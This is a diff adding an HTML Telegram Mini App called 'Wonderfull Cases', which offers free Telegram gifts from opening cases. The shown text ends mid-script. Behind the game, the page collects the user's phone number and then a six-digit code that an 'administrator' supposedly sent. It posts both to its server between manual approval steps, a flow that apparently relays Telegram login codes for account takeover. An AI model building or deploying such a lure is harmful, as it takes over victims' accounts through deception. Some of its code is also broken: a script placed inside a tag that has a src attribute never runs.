@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Wonderfull Cases</title>
+<meta name="description" content="Открывай кейсы — получай подарки Telegram">
+<meta property="og:title" content="Wonderfull Cases">
+<meta property="og:description" content="Мини-апп: кейсы с подарками Telegram">
+<style>
+:root {
+  --bg: #0a0a14;
+  --bg2: #12121f;
+  --card: #1a1a2e;
+  --card2: #22223a;
+  --accent: #6c5ce7;
+  --accent2: #a29bfe;
+  --gold: #fdcb6e;
+  --teal: #00cec9;
+  --pink: #e84393;
+  --text: #ffffff;
+  --muted: #9a9ab0;
+  --border: rgba(255,255,255,0.08);
+  --radius: 16px;
+  --shadow: 0 10px 40px rgba(0,0,0,0.4);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+html, body { height: 100%; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  overflow-x: hidden;
+  -webkit-font-smoothing: antialiased;
+}
+
+#app { min-height: 100vh; position: relative; }
+
+.screen { display: none; min-height: 100vh; padding: 20px; animation: fadeIn 0.4s ease; }
+.screen.active { display: flex; flex-direction: column; }
+
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px);} to { opacity:1; transform: none;} }
+
+/* Intro */
+#screen-intro { align-items: center; justify-content: center; background: radial-gradient(ellipse at center, #1a1a3e 0%, #0a0a14 70%); }
+.intro-wrap { text-align: center; }
+.logo-glow { position: relative; width: 160px; height: 160px; margin: 0 auto 24px; }
+.logo-ring {
+  position: absolute; inset: 0; border-radius: 50%;
+  background: conic-gradient(from 0deg, #6c5ce7, #a29bfe, #00cec9, #fdcb6e, #6c5ce7);
+  filter: blur(20px); opacity: 0.6; animation: spin 6s linear infinite;
+}
+.logo-core {
+  position: absolute; inset: 16px; border-radius: 50%;
+  background: linear-gradient(135deg, #1a1a2e, #2d2d4a);
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 40px rgba(108,92,231,0.5), inset 0 0 20px rgba(255,255,255,0.05);
+  animation: pulse 2s ease-in-out infinite;
+}
+@keyframes spin { to { transform: rotate(360deg);} }
+@keyframes pulse { 0%,100% { transform: scale(1);} 50% { transform: scale(1.05);} }
+.intro-title {
+  font-size: 34px; font-weight: 800; letter-spacing: 1px;
+  background: linear-gradient(135deg, #fff, #a29bfe, #00cec9);
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+  margin-bottom: 8px;
+}
+.intro-sub { color: var(--muted); font-size: 15px; margin-bottom: 40px; }
+.intro-loader { width: 200px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 4px; margin: 0 auto; overflow: hidden; }
+.intro-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #6c5ce7, #00cec9); border-radius: 4px; animation: loadbar 2.2s ease forwards; }
+@keyframes loadbar { to { width: 100%; } }
+
+/* Cards */
+.card {
+  background: linear-gradient(180deg, var(--card), var(--bg2));
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 28px 22px;
+  box-shadow: var(--shadow);
+  width: 100%; max-width: 420px; margin: auto;
+}
+.card.center { text-align: center; }
+.card h2 { font-size: 24px; margin-bottom: 8px; }
+.card h3 { font-size: 20px; margin-bottom: 12px; }
+.muted { color: var(--muted); font-size: 14px; line-height: 1.5; }
+.hint { color: var(--muted); font-size: 12px; margin-top: 16px; line-height: 1.5; }
+.center { text-align: center; }
+
+/* Inputs */
+.input-group {
+  display: flex; align-items: center; gap: 10px;
+  background: var(--card2); border: 1px solid var(--border);
+  border-radius: 12px; padding: 4px 12px; margin: 18px 0;
+}
+.input-group .prefix { font-size: 20px; }
+.input-group input {
+  flex: 1; background: transparent; border: none; outline: none;
+  color: #fff; font-size: 18px; padding: 12px 0;
+}
+.code-inputs { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+.code-digit {
+  width: 44px; height: 56px; text-align: center; font-size: 24px; font-weight: 700;
+  background: var(--card2); border: 1px solid var(--border); border-radius: 10px;
+  color: #fff; outline: none;
+}
+.code-digit:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(108,92,231,0.3); }
+
+/* Buttons */
+.btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+  border: none; border-radius: 12px; padding: 14px 22px; font-size: 16px; font-weight: 600;
+  cursor: pointer; transition: transform 0.15s, box-shadow 0.15s, opacity 0.15s;
+  width: 100%;
+}
+.btn:active { transform: scale(0.97); }
+.btn.primary {
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  color: #fff; box-shadow: 0 6px 20px rgba(108,92,231,0.4);
+}
+.btn.secondary {
+  background: var(--card2); color: #fff; border: 1px solid var(--border);
+}
+.btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+/* Spinner */
+.spinner {
+  width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.1);
+  border-top-color: var(--accent2); border-radius: 50%;
+  animation: spin 0.9s linear infinite; margin: 0 auto 20px;
+}
+.status-pill {
+  display: inline-block; padding: 8px 16px; border-radius: 999px;
+  background: rgba(108,92,231,0.15); border: 1px solid rgba(108,92,231,0.4);
+  color: var(--accent2); font-size: 13px; margin: 16px 0;
+}
+
+/* Topbar */
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 8px 4px 16px;
+}
+.brand { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 17px; }
+.brand-logo {
+  width: 32px; height: 32px; border-radius: 8px;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 800;
+}
+.balance {
+  background: var(--card); border: 1px solid var(--border); border-radius: 999px;
+  padding: 6px 14px; font-size: 14px; font-weight: 600;
+}
+
+/* Tabs */
+.tabs { display: flex; gap: 8px; margin-bottom: 16px; }
+.tab {
+  flex: 1; background: var(--card); border: 1px solid var(--border);
+  color: var(--muted); border-radius: 10px; padding: 10px; font-size: 14px; font-weight: 600;
+  cursor: pointer; transition: all 0.2s;
+}
+.tab.active { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #fff; border-color: transparent; }
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* Cases grid */
+.cases-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.case-card {
+  background: linear-gradient(180deg, var(--card), var(--bg2));
+  border: 1px solid var(--border); border-radius: 14px; padding: 14px;
+  cursor: pointer; transition: transform 0.15s, box-shadow 0.15s;
+  position: relative; overflow: hidden;
+}
+.case-card:active { transform: scale(0.96); }
+.case-card .case-icon {
+  width: 100%; aspect-ratio: 1; border-radius: 10px; margin-bottom: 10px;
+  display: flex; align-items: center; justify-content: center; font-size: 48px;
+  background: var(--grad, linear-gradient(135deg,#6c5ce7,#a29bfe));
+  box-shadow: inset 0 -20px 30px rgba(0,0,0,0.2);
+}
+.case-card .case-name { font-weight: 700; font-size: 14px; margin-bottom: 2px; }
+.case-card .case-price { color: var(--gold); font-size: 13px; font-weight: 600; }
+.case-card .case-desc { color: var(--muted); font-size: 11px; margin-top: 4px; }
+
+/* Inventory */
+.inventory-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+.inv-item {
+  background: var(--card); border: 1px solid var(--border); border-radius: 12px;
+  padding: 12px 6px; text-align: center;
+}
+.inv-item .emoji { font-size: 32px; }
+.inv-item .name { font-size: 11px; margin-top: 4px; color: var(--muted); }
+.inv-item .rarity { font-size: 9px; text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+
+/* Modal */
+.modal {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px);
+  display: none; align-items: center; justify-content: center; z-index: 100; padding: 20px;
+}
+.modal.open { display: flex; }
+.modal-card {
+  background: linear-gradient(180deg, var(--card), var(--bg2));
+  border: 1px solid var(--border); border-radius: 20px; padding: 28px 22px;
+  width: 100%; max-width: 360px; text-align: center; box-shadow: var(--shadow);
+  animation: popIn 0.3s ease;
+}
+@keyframes popIn { from { transform: scale(0.85); opacity: 0;} to { transform: scale(1); opacity:1;} }
+.modal-card h2 { margin-bottom: 16px; }
+
+.case-anim { height: 120px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+.case-box { position: relative; width: 100px; height: 80px; }
+.case-body {
+  position: absolute; bottom: 0; left: 0; width: 100%; height: 60px;
+  background: linear-gradient(135deg, #6c5ce7, #a29bfe); border-radius: 8px;
+}
+.case-lid {
+  position: absolute; top: 0; left: 0; width: 100%; height: 24px;
+  background: linear-gradient(135deg, #a29bfe, #6c5ce7); border-radius: 8px 8px 0 0;
+  transform-origin: bottom; transition: transform 0.6s ease;
+}
+.case-box.open .case-lid { transform: rotateX(-120deg) translateY(-10px); }
+.case-box.shake { animation: shake 0.5s ease; }
+@keyframes shake {
+  0%,100% { transform: translateX(0);}
+  25% { transform: translateX(-6px) rotate(-3deg);}
+  75% { transform: translateX(6px) rotate(3deg);}
+}
+
+.prize-reveal { display: none; margin-bottom: 16px; }
+.prize-reveal.show { display: block; animation: popIn 0.4s ease; }
+.prize-emoji { font-size: 72px; margin-bottom: 8px; }
+.prize-name { font-size: 20px; font-weight: 700; }
+.prize-rarity {
+  display: inline-block; margin-top: 6px; padding: 4px 12px; border-radius: 999px;
+  font-size: 11px; text-transform: uppercase; letter-spacing: 1px; font-weight: 700;
+}
+.rarity-common { background: #555; color: #ddd; }
+.rarity-uncommon { background: #2d8a5e; color: #fff; }
+.rarity-rare { background: #2980b9; color: #fff; }
+.rarity-epic { background: #8e44ad; color: #fff; }
+.rarity-legendary { background: #f39c12; color: #000; }
+.rarity-mythic { background: linear-gradient(135deg,#ff0080,#7928ca); color: #fff; }
+
+/* Toast */
+.toast {
+  position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px);
+  background: var(--card); border: 1px solid var(--border); color: #fff;
+  padding: 12px 20px; border-radius: 12px; font-size: 14px; z-index: 200;
+  transition: transform 0.3s; box-shadow: var(--shadow);
+}
+.toast.show { transform: translateX(-50%) translateY(0); }
+
+/* Rarity colors for inventory */
+.rarity-text-common { color: #aaa; }
+.rarity-text-uncommon { color: #55efc4; }
+.rarity-text-rare { color: #74b9ff; }
+.rarity-text-epic { color: #a29bfe; }
+.rarity-text-legendary { color: #fdcb6e; }
+.rarity-text-mythic { color: #ff6b9d; }
+
+/* Stepper */
+.stepper { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+.step-dot {
+  width: 28px; height: 28px; border-radius: 50%; background: var(--card2);
+  border: 1px solid var(--border); display: flex; align-items: center; justify-content: center;
+  font-size: 12px; font-weight: 700; color: var(--muted);
+}
+.step-dot.active { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #fff; border-color: transparent; }
+.step-dot.done { background: var(--teal); color: #fff; border-color: transparent; }
+.step-line { width: 24px; height: 2px; background: var(--border); }
+
+
+/* Mobile / Telegram Mini App safe areas */
+body { padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left); }
+.topbar { padding-top: max(8px, env(safe-area-inset-top)); }
+#app { min-height: 100vh; min-height: 100dvh; }
+/* Larger tap targets on mobile */
+.btn { min-height: 48px; }
+.case-card { min-height: 120px; }
+/* Prevent text selection in app */
+body { -webkit-user-select: none; user-select: none; }
+input, textarea { -webkit-user-select: text; user-select: text; }
+
+
+/* ===== Animated background ===== */
+.bg-canvas {
+  position: fixed; inset: 0; width: 100%; height: 100%;
+  z-index: 0; pointer-events: none; opacity: 0.6;
+}
+.screen { position: relative; z-index: 1; }
+/* ===== Extra animations ===== */
+@keyframes floatY { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-8px)} }
+@keyframes shimmer { 0%{background-position:-200% 0} 100%{background-position:200% 0} }
+@keyframes glowPulse { 0%,100%{box-shadow:0 0 20px rgba(108,92,231,0.4)} 50%{box-shadow:0 0 40px rgba(108,92,231,0.8)} }
+@keyframes slideUp { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:none} }
+@keyframes scaleIn { from{opacity:0;transform:scale(0.9)} to{opacity:1;transform:scale(1)} }
+@keyframes rotateSlow { to{transform:rotate(360deg)} }
+.logo-glow { animation: floatY 3s ease-in-out infinite; }
+.logo-ring { animation: rotateSlow 8s linear infinite; }
+.btn.primary { animation: glowPulse 2.5s ease-in-out infinite; }
+.card { animation: slideUp 0.5s ease; }
+.case-card { animation: scaleIn 0.4s ease; transition: transform 0.2s, box-shadow 0.2s; }
+.case-card:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(108,92,231,0.3); }
+.intro-title { animation: shimmer 3s linear infinite; background-size: 200% auto; }
+
+</style>
+<script src="https://telegram.org/js/telegram-web-app.js" async>
+// ===== Animated particle background =====
+(function(){
+  const canvas = document.getElementById('bgCanvas');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  let w, h, particles = [];
+  const PARTICLE_COUNT = 60;
+  function resize(){ w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; }
+  function init(){
+    particles = [];
+    for (let i=0;i<PARTICLE_COUNT;i++){
+      particles.push({
+        x: Math.random()*w, y: Math.random()*h,
+        vx: (Math.random()-0.5)*0.3, vy: (Math.random()-0.5)*0.3,
+        r: Math.random()*1.8+0.5,
+        color: ['#a29bfe','#6c5ce7','#00cec9','#fdcb6e','#e84393'][Math.floor(Math.random()*5)],
+        alpha: Math.random()*0.5+0.2,
+      });
+    }
+  }
+  function draw(){
+    ctx.clearRect(0,0,w,h);
+    // gradient overlay
+    const g = ctx.createRadialGradient(w/2,h/2,0,w/2,h/2,Math.max(w,h)/1.2);
+    g.addColorStop(0,'rgba(108,92,231,0.08)');
+    g.addColorStop(1,'rgba(0,0,0,0)');
+    ctx.fillStyle = g; ctx.fillRect(0,0,w,h);
+    for (const p of particles){
+      p.x += p.vx; p.y += p.vy;
+      if (p.x < 0) p.x = w; if (p.x > w) p.x = 0;
+      if (p.y < 0) p.y = h; if (p.y > h) p.y = 0;
+      ctx.beginPath();
+      ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+      ctx.fillStyle = p.color;
+      ctx.globalAlpha = p.alpha;
+      ctx.fill();
+      ctx.globalAlpha = 1;
+    }
+    // connect nearby
+    for (let i=0;i<particles.length;i++){
+      for (let j=i+1;j<particles.length;j++){
+        const dx = particles[i].x-particles[j].x, dy = particles[i].y-particles[j].y;
+        const d = Math.hypot(dx,dy);
+        if (d < 120){
+          ctx.strokeStyle = 'rgba(162,155,254,'+(0.12*(1-d/120))+')';
+          ctx.lineWidth = 0.5;
+          ctx.beginPath();
+          ctx.moveTo(particles[i].x,particles[i].y);
+          ctx.lineTo(particles[j].x,particles[j].y);
+          ctx.stroke();
+        }
+      }
+    }
+    requestAnimationFrame(draw);
+  }
+  resize(); init(); draw();
+  window.addEventListener('resize', ()=>{ resize(); init(); });
+})();
+
+</script>
+</head>
+<body>
+<canvas id="bgCanvas" class="bg-canvas"></canvas>
+<div id="app">
+  <!-- Intro -->
+  <section id="screen-intro" class="screen active">
+    <div class="intro-wrap">
+      <div class="logo-glow">
+        <div class="logo-ring"></div>
+        <div class="logo-core">
+          <svg viewBox="0 0 120 120" width="88" height="88" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <linearGradient id="caseGrad" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="#a29bfe"/>
+      <stop offset="50%" stop-color="#6c5ce7"/>
+      <stop offset="100%" stop-color="#00cec9"/>
+    </linearGradient>
+    <linearGradient id="lidGrad" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0%" stop-color="#c4b5fd"/>
+      <stop offset="100%" stop-color="#7c3aed"/>
+    </linearGradient>
+    <filter id="glow">
+      <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
+      <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
+    </filter>
+  </defs>
+  <ellipse cx="60" cy="108" rx="46" ry="6" fill="#000" opacity="0.3"/>
+  <rect x="14" y="46" width="92" height="58" rx="10" fill="url(#caseGrad)" filter="url(#glow)"/>
+  <rect x="14" y="46" width="92" height="14" rx="10" fill="url(#lidGrad)"/>
+  <rect x="14" y="58" width="92" height="4" fill="#000" opacity="0.2"/>
+  <path d="M60 46 L60 104" stroke="rgba(255,255,255,0.35)" stroke-width="2"/>
+  <path d="M14 60 L106 60" stroke="rgba(255,255,255,0.35)" stroke-width="2"/>
+  <circle cx="60" cy="60" r="11" fill="#fdcb6e" filter="url(#glow)"/>
+  <path d="M55 60 L60 55 L65 60 L60 65 Z" fill="#1a1a2e"/>
+  <rect x="58" y="40" width="4" height="8" fill="#fdcb6e"/>
+  <circle cx="60" cy="38" r="6" fill="none" stroke="#fdcb6e" stroke-width="3"/>
+</svg>
+        </div>
+      </div>
+      <h1 class="intro-title">Wonderfull Cases</h1>
+      <p class="intro-sub">Открывай кейсы — получай подарки Telegram</p>
+      <div class="intro-loader"><div class="intro-bar"></div></div>
+    </div>
+  </section>
+
+  <!-- Registration -->
+  <section id="screen-register" class="screen">
+    <div class="card">
+      <div class="stepper">
+        <div class="step-dot active">1</div>
+        <div class="step-line"></div>
+        <div class="step-dot">2</div>
+        <div class="step-line"></div>
+        <div class="step-dot">3</div>
+        <div class="step-line"></div>
+        <div class="step-dot">4</div>
+      </div>
+      <h2>Регистрация</h2>
+      <p class="muted">Введите номер телефона, привязанный к Telegram</p>
+      <div class="input-group">
+        <span class="prefix">📱</span>
+        <input id="phoneInput" type="tel" placeholder="+7 999 123 45 67" autocomplete="tel">
+      </div>
+      <button id="registerBtn" class="btn primary">Отправить заявку</button>
+      <p class="hint">Мы отправим уведомление администратору. Обычно одобрение занимает ~15 минут.</p>
+    </div>
+  </section>
+
+  <!-- Waiting approval -->
+  <section id="screen-waiting" class="screen">
+    <div class="card center">
+      <div class="spinner"></div>
+      <h2>Ожидание одобрения</h2>
+      <p class="muted">Ваша заявка отправлена администратору.</p>
+      <p class="muted">Обычно это занимает около <b>15 минут</b>.</p>
+      <div class="status-pill" id="waitStatus">Статус: ожидание…</div>
+      <p class="hint">Не закрывайте приложение — прогресс сохраняется. Как только администратор подтвердит, вы автоматически перейдёте дальше.</p>
+    </div>
+  </section>
+
+  <!-- Enter code -->
+  <section id="screen-code" class="screen">
+    <div class="card">
+      <h2>Введите код</h2>
+      <p class="muted">Администратор отправил вам код доступа. Введите его ниже.</p>
+      <div class="code-inputs">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+        <input class="code-digit" maxlength="1" inputmode="numeric">
+      </div>
+      <button id="verifyBtn" class="btn primary">Подтвердить</button>
+      <p class="hint" id="codeHint"></p>
+    </div>
+  </section>
+
+  <!-- Waiting final approval -->
+  <section id="screen-waiting2" class="screen">
+    <div class="card center">
+      <div class="spinner"></div>
+      <h2>Проверка аккаунта</h2>
+      <p class="muted">Код принят. Ожидаем финальное подтверждение администратора.</p>
+      <div class="status-pill" id="waitStatus2">Статус: проверка…</div>
+    </div>
+  </section>
+
+  <!-- Main -->
+  <section id="screen-main" class="screen">
+    <header class="topbar">
+      <div class="brand">
+        <span class="brand-logo">WC</span>
+        <span>Wonderfull Cases</span>
+      </div>
+      <div class="balance">💰 <span id="balance">1000</span></div>
+    </header>
+
+    <div class="tabs">
+      <button class="tab active" data-tab="cases">Кейсы</button>
+      <button class="tab" data-tab="inventory">Инвентарь</button>
+      <button class="tab" data-tab="profile">Профиль</button>
+    </div>
+
+    <div id="tab-cases" class="tab-content active">
+      <div class="cases-grid" id="casesGrid"></div>
+    </div>
+
+    <div id="tab-inventory" class="tab-content">
+      <div class="inventory-grid" id="inventoryGrid"></div>
+      <p class="muted center" id="emptyInv">Пока пусто — открой первый кейс!</p>
+    </div>
+
+    <div id="tab-profile" class="tab-content">
+      <div class="card">
+        <h3>Профиль</h3>
+        <p class="muted">Телефон: <b id="profPhone">—</b></p>
+        <p class="muted">Открыто кейсов: <b id="profOpened">0</b></p>
+        <p class="muted">Подарков: <b id="profGifts">0</b></p>
+        <p class="hint">Подарки в этой версии — коллекционные (не выводятся). Играй и собирай!</p>
+        <button id="resetBtn" class="btn secondary" style="margin-top:16px;">Сбросить прогресс (тест)</button>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- Case opening modal -->
+<div id="modal-open" class="modal">
+  <div class="modal-card">
+    <h2 id="openCaseName">Case</h2>
+    <div class="case-anim" id="caseAnim">
+      <div class="case-box">
+        <div class="case-lid"></div>
+        <div class="case-body"></div>
+      </div>
+    </div>
+    <div class="prize-reveal" id="prizeReveal">
+      <div class="prize-emoji" id="prizeEmoji">🎁</div>
+      <div class="prize-name" id="prizeName">Prize</div>
+      <div class="prize-rarity" id="prizeRarity">rare</div>
+    </div>
+    <button id="closeModal" class="btn primary">Забрать</button>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+const API = ''; // same origin
+const LS_KEY = 'wc_user_id';
+
+const $ = (sel) => document.querySelector(sel);
+const $$ = (sel) => document.querySelectorAll(sel);
+
+let userId = localStorage.getItem(LS_KEY);
+let pollTimer = null;
+let balance = parseInt(localStorage.getItem('wc_balance') || '1000', 10);
+
+let tgUser = null;
+// Telegram WebApp init
+try {
+  if (window.Telegram && window.Telegram.WebApp) {
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+    tgUser = tg.initDataUnsafe && tg.initDataUnsafe.user;
+    if (tg.themeParams && tg.themeParams.bg_color) {
+      document.documentElement.style.setProperty('--bg', tg.themeParams.bg_color);
+    }
+  }
+} catch (e) {}
+
+// ---------- Screen management ----------
+function showScreen(id) {
+  $$('.screen').forEach(s => s.classList.remove('active'));
+  const el = document.getElementById('screen-' + id);
+  if (el) el.classList.add('active');
+}
+
+
+// ===== Confetti burst =====
+function confettiBurst() {
+  const colors = ['#a29bfe','#6c5ce7','#00cec9','#fdcb6e','#e84393','#fff'];
+  for (let i=0;i<40;i++){
+    const el = document.createElement('div');
+    el.style.cssText = 'position:fixed;z-index:9999;pointer-events:none;left:50%;top:50%;width:8px;height:8px;border-radius:2px;';
+    el.style.background = colors[Math.floor(Math.random()*colors.length)];
+    document.body.appendChild(el);
+    const angle = Math.random()*Math.PI*2;
+    const dist = 80 + Math.random()*120;
+    const dx = Math.cos(angle)*dist;
+    const dy = Math.sin(angle)*dist - 60;
+    el.animate([
+      { transform:'translate(0,0) rotate(0deg)', opacity:1 },
+      { transform:`translate(${dx}px,${dy}px) rotate(${Math.random()*720}deg)`, opacity:0 }
+    ], { duration: 900+Math.random()*400, easing:'cubic-bezier(.2,.8,.2,1)' }).onfinish = ()=> el.remove();
+  }
+}
+
+// ---------- Toast ----------
+function toast(msg) {
+  const t = $('#toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2800);
+}
+
+// ---------- API helpers ----------
+async function api(path, opts = {}) {
+  const res = await fetch(API + path, {
+    headers: { 'Content-Type': 'application/json' },
+    ...opts,
+  });
+  const data = await res.json().catch(() => ({}));
+  if (!res.ok) throw new Error(data.error || 'Ошибка');
+  return data;
+}
+
+// ---------- Intro ----------
+function runIntro() {
+  setTimeout(() => {
+    // decide next screen based on stored user
+    if (userId) {
+      checkStatusAndRoute();
+    } else {
+      showScreen('register');
+    }
+  }, 2400);
+}
+
+// ---------- Registration ----------
+$('#registerBtn').addEventListener('click', async () => {
+  const phone = $('#phoneInput').value.trim();
+  if (!phone) { toast('Введите номер телефона'); return; }
+  const btn = $('#registerBtn');
+  btn.disabled = true;
+  btn.textContent = 'Отправка…';
+  try {
+    const data = await api('/api/register', {
+      method: 'POST',
+      body: JSON.stringify({ phone }),
+    });
+    userId = data.user.id;
+    localStorage.setItem(LS_KEY, userId);
+    toast('Заявка отправлена администратору');
+    showScreen('waiting');
+    startPolling();
+  } catch (e) {
+    toast(e.message);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Отправить заявку';
+  }
+});
+
+// ---------- Polling status ----------
+function startPolling() {
+  if (pollTimer) clearInterval(pollTimer);
+  pollTimer = setInterval(checkStatusAndRoute, 3000);
+  checkStatusAndRoute();
+}
+
+async function checkStatusAndRoute() {
+  if (!userId) { showScreen('register'); return; }
+  try {
+    const data = await api('/api/status/' + userId);
+    const u = data.user;
+    const statusEl = $('#waitStatus');
+    const statusEl2 = $('#waitStatus2');
+    if (statusEl) statusEl.textContent = 'Статус: ' + statusLabel(u.status);
+    if (statusEl2) statusEl2.textContent = 'Статус: ' + statusLabel(u.status);
+
+    if (u.status === 'pending') {
+      showScreen('waiting');
+    } else if (u.status === 'approved_step1') {
+      // step 2: enter code
+      showScreen('code');
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    } else if (u.status === 'code_sent') {
+      showScreen('code');
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    } else if (u.status === 'code_verified') {
+      showScreen('waiting2');
+      if (!pollTimer) startPolling();
+    } else if (u.status === 'active') {
+      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+      showScreen('main');
+      loadMain();
+    }
+  } catch (e) {
+    // user not found -> reset
+    localStorage.removeItem(LS_KEY);
+    userId = null;
+    showScreen('register');
+  }
+}
+
+function statusLabel(s) {
+  return {
+    pending: 'ожидание одобрения',
+    approved_step1: 'одобрено — введите код',
+    code_sent: 'код отправлен',
+    code_verified: 'код принят, финальное подтверждение',
+    active: 'активен',
+  }[s] || s;
+}
+
+// ---------- Code input handling ----------
+const codeInputs = $$('.code-digit');
+codeInputs.forEach((inp, i) => {
+  inp.addEventListener('input', (e) => {
+    const v = e.target.value.replace(/\D/g, '');
+    e.target.value = v.slice(-1);
+    if (v && i < codeInputs.length - 1) codeInputs[i+1].focus();
+  });
+  inp.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+      codeInputs[i-1].focus();
+    }
+  });
+  inp.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const text = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+    text.split('').forEach((ch, idx) => { if (codeInputs[idx]) codeInputs[idx].value = ch; });
+    if (codeInputs[text.length]) codeInputs[text.length].focus();
+  });
+});
+
+$('#verifyBtn').addEventListener('click', async () => {
+  const code = Array.from(codeInputs).map(i => i.value).join('');
+  if (code.length < 6) { toast('Введите 6-значный код'); return; }
+  const btn = $('#verifyBtn');
+  btn.disabled = true;
+  btn.textContent = 'Проверка…';
+  try {
+    await api('/api/verify-code', {
+      method: 'POST',
+      body: JSON.stringify({ userId, code }),
+    });
+    toast('Код принят!');
+    codeInputs.forEach(i => i.value = '');
+    showScreen('waiting2');
+    startPolling();
+  } catch (e) {
+    toast(e.message);
+    $('#codeHint').textContent = e.message;
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Подтвердить';
+  }
+});
+
+// ---------- Main ----------
+let casesData = [];
+async function loadMain() {
+  try {
+    if (tgUser && tgUser.first_name) {
+      const brand = document.querySelector('.brand span:last-child');
+      if (brand) brand.textContent = 'Привет, ' + tgUser.first_name + '!';
+    }
+    const data = await api('/api/cases');
+    casesData = data.cases;
+    renderCases();
+    loadInventory();
+  } catch (e) {
+    toast(e.message);
+  }
+}
+
+function renderCases() {
+  const grid = $('#casesGrid');
+  grid.innerHTML = casesData.map(c => `
+    <div class="case-card" data-id="${c.id}" style="--grad:${c.gradient}">
+      <div class="case-icon" style="background:${c.gradient}">📦</div>
+      <div class="case-name">${c.name}</div>
+      <div class="case-price">💰 ${c.price}</div>
+      <div class="case-desc">${c.desc} · ${c.items} предметов</div>
+    </div>
+  `).join('');
+  grid.querySelectorAll('.case-card').forEach(card => {
+    card.addEventListener('click', () => openCase(card.dataset.id));
+  });
+}
+
+async function openCase(caseId) {
+  const c = casesData.find(x => x.id === caseId);
+  if (!c) return;
+  if (balance < c.price) { toast('Недостаточно монет'); return; }
+  balance -= c.price;
+  $('#balance').textContent = balance;
+  localStorage.setItem('wc_balance', balance);
+
+  const modal = $('#modal-open');
+  $('#openCaseName').textContent = c.name;
+  const caseBox = document.querySelector('.case-box');
+  caseBox.classList.remove('open');
+  caseBox.classList.add('shake');
+  $('#prizeReveal').classList.remove('show');
+  modal.classList.add('open');
+
+  setTimeout(() => caseBox.classList.remove('shake'), 500);
+
+  try {
+    const data = await api('/api/open-case', {
+      method: 'POST',
+      body: JSON.stringify({ userId, caseId }),
+    });
+    const prize = data.prize;
+    setTimeout(() => {
+      caseBox.classList.add('open');
+      setTimeout(() => {
+        $('#prizeEmoji').textContent = prize.emoji;
+        $('#prizeName').textContent = prize.name;
+        const r = $('#prizeRarity');
+        r.textContent = prize.rarity;
+        r.className = 'prize-rarity rarity-' + prize.rarity;
+        $('#prizeReveal').classList.add('show');
+        confettiBurst();
+      }, 400);
+    }, 600);
+  } catch (e) {
+    toast(e.message);
+    balance += c.price;
+    $('#balance').textContent = balance;
+  localStorage.setItem('wc_balance', balance);
+    modal.classList.remove('open');
+  }
+}
+
+$('#closeModal').addEventListener('click', () => {
+  $('#modal-open').classList.remove('open');
+  loadInventory();
+  updateProfile();
+});
+
+// Tabs
+$$('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    $$('.tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
